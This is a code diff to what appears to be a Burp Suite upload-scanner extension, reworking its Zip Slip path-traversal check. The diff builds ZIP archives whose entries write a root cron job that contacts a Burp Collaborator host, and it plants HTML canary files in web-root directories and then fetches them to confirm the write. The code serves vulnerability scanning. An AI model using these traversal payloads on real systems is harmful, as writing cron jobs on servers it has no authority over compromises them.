@@ -3747,21 +3747,9 @@ trailer <<
 
     def _zip_slip(self, injector, burp_colab):
         # Zip Slip / CVE-2018-1002201 class: archive entries with ../ paths write files outside
-        # the extraction dir. Detection: write a cron job that contacts collaborator within 60s.
-        if not burp_colab:
-            return []
-
-        name = "Zip Slip (archive path traversal)"
-        severity = "High"
-        confidence = "Firm"
-        base_detail = "A crafted ZIP archive was uploaded with an entry whose filename traverses outside " \
-                      "the intended extraction directory (Zip Slip, CVE-2018-1002201 class). " \
-                      "If the server extracts without sanitising entry names, arbitrary files can be " \
-                      "written on the filesystem. See https://github.com/snyk/zip-slip-vulnerability for details. "
-        detail_colab = "A Burp Collaborator interaction was detected after uploading a ZIP archive whose " \
-                       "entry traverses to '{}'. A cron job using '{}' was written there and executed. " \
-                       "This confirms arbitrary file write outside the upload directory, typically leading " \
-                       "to Remote Code Execution. Interactions:<br><br>"
+        # the extraction dir.
+        # Phase 1 (collaborator): write a cron job that contacts collaborator within 60s.
+        # Phase 2 (active GET): plant an HTML canary at web-root paths, then GET it to confirm.
 
         colab_tests = []
 
@@ -3781,28 +3769,103 @@ trailer <<
             ('', BurpExtender.MARKER_ORIG_EXT, ''),
         ]
 
-        targets = []
-        for depth in range(2, 7):
-            prefix = "../" * depth
-            targets.append((depth, prefix + "etc/cron.d/upload_scanner"))
-            targets.append((depth, prefix + "var/spool/cron/crontabs/root"))
+        # --- Phase 1: cron-based collaborator detection ---
+        if burp_colab:
+            name_cron = "Zip Slip (archive path traversal)"
+            severity_cron = "High"
+            confidence_cron = "Firm"
+            base_detail_cron = "A crafted ZIP archive was uploaded with an entry whose filename traverses outside " \
+                               "the intended extraction directory (Zip Slip, CVE-2018-1002201 class). " \
+                               "If the server extracts without sanitising entry names, arbitrary files can be " \
+                               "written on the filesystem. See https://github.com/snyk/zip-slip-vulnerability for details. "
+            detail_colab = "A Burp Collaborator interaction was detected after uploading a ZIP archive whose " \
+                           "entry traverses to '{}'. A cron job using '{}' was written there and executed. " \
+                           "This confirms arbitrary file write outside the upload directory, typically leading " \
+                           "to Remote Code Execution. Interactions:<br><br>"
 
-        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
-            domain_only = replace and not callable(replace)
-            for depth, entry_path in targets:
-                details = base_detail + detail_colab.format(entry_path, cmd)
-                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
-                _ep = entry_path
-                _cmd = cmd
-                _do = domain_only
-                def _make_zip(_, full_url, _ep=_ep, _cmd=_cmd, _do=_do):
-                    url = full_url.split("://")[-1].rstrip("/") if _do else full_url
-                    cron_line = "* * * * * root {} {} 2>/dev/null\n".format(_cmd, url)
-                    return _traversal_zip(_ep, cron_line)
-                tag = entry_path.replace("/", "").replace(".", "").replace("_", "")[-8:]
-                basename = self.FILE_START + "ZipSlip" + str(depth) + tag + cmd_name
-                colab_tests.extend(self._send_collaborator(injector, burp_colab, zip_types, basename, "",
-                                                           issue, replace=_make_zip))
+            cron_targets = []
+            for depth in range(2, 7):
+                prefix = "../" * depth
+                cron_targets.append((depth, prefix + "etc/cron.d/upload_scanner"))
+                cron_targets.append((depth, prefix + "var/spool/cron/crontabs/root"))
+
+            for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
+                domain_only = replace and not callable(replace)
+                for depth, entry_path in cron_targets:
+                    details = base_detail_cron + detail_colab.format(entry_path, cmd)
+                    issue = self._create_issue_template(injector.get_brr(), name_cron, details, confidence_cron, severity_cron)
+                    _ep = entry_path
+                    _cmd = cmd
+                    _do = domain_only
+                    def _make_zip(_, full_url, _ep=_ep, _cmd=_cmd, _do=_do):
+                        url = full_url.split("://")[-1].rstrip("/") if _do else full_url
+                        cron_line = "* * * * * root {} {} 2>/dev/null\n".format(_cmd, url)
+                        return _traversal_zip(_ep, cron_line)
+                    tag = entry_path.replace("/", "").replace(".", "").replace("_", "")[-8:]
+                    basename = self.FILE_START + "ZipSlip" + str(depth) + tag + cmd_name
+                    colab_tests.extend(self._send_collaborator(injector, burp_colab, zip_types, basename, "",
+                                                               issue, replace=_make_zip))
+
+        # --- Phase 2: web-root canary — plant HTML file, then actively GET it ---
+        canary_tag = ''.join(random.sample(string.ascii_letters, 8))
+        canary_filename = "zipslip_" + canary_tag + ".html"
+        canary_content = "<html><body>UploadScannerZipSlipProof-{}</body></html>".format(canary_tag)
+
+        webroot_targets = []
+        for depth in range(1, 8):
+            webroot_targets.append("../" * depth + canary_filename)
+        for depth in range(1, 6):
+            prefix = "../" * depth
+            webroot_targets += [
+                prefix + "var/www/html/" + canary_filename,
+                prefix + "srv/www/" + canary_filename,
+                prefix + "usr/share/nginx/html/" + canary_filename,
+                prefix + "var/www/" + canary_filename,
+            ]
+
+        name_web = "Zip Slip — web root file write confirmed"
+        detail_web = ("A crafted ZIP archive was uploaded with a traversal entry '{}' containing a canary HTML file. "
+                      "The file was subsequently retrieved via GET /{}, confirming that the server extracted the "
+                      "archive without sanitising entry names and that the file landed in a web-accessible directory. "
+                      "This proves arbitrary file write and likely leads to Remote Code Execution. "
+                      "See https://github.com/snyk/zip-slip-vulnerability for details.")
+
+        def _try_fetch_canary():
+            brr = injector.get_brr()
+            service = brr.getHttpService()
+            iRequestInfo = self._helpers.analyzeRequest(brr)
+            headers = list(iRequestInfo.getHeaders())[1:]
+            clean = [h for h in headers
+                     if not any(h.lower().startswith(bh) for bh in BurpExtender.REDL_URL_BAD_HEADERS)]
+            clean.append("Accept: text/html,*/*")
+            req = ("GET /" + canary_filename + " HTTP/1.1" + BurpExtender.NEWLINE +
+                   BurpExtender.NEWLINE.join(clean) + BurpExtender.NEWLINE * 2)
+            try:
+                attack = self._callbacks.makeHttpRequest(service, req)
+                resp = attack.getResponse()
+                if resp and canary_tag in FloydsHelpers.jb2ps(resp):
+                    return attack
+            except Exception:
+                pass
+            return None
+
+        zip_web_types = [('', '.zip', ''), ('', '.zip', 'application/zip')]
+        for entry_path in webroot_targets:
+            arc = _traversal_zip(entry_path, canary_content)
+            tag = entry_path.replace("/", "").replace(".", "").replace("_", "")[-10:]
+            basename = self.FILE_START + "ZipSlipWeb" + tag
+            for prefix, ext, mime in zip_web_types:
+                req = injector.get_request(prefix + basename + ext, arc, content_type=mime)
+                if not req:
+                    continue
+                self._make_http_request(injector, req)
+            fetch_rr = _try_fetch_canary()
+            if fetch_rr:
+                detail = detail_web.format(entry_path, canary_filename)
+                issue = self._create_issue_template(injector.get_brr(), name_web, detail, "Certain", "High")
+                issue.httpMessagesPy = [fetch_rr]
+                self._add_scan_issue(issue)
+                break
 
         return colab_tests
 
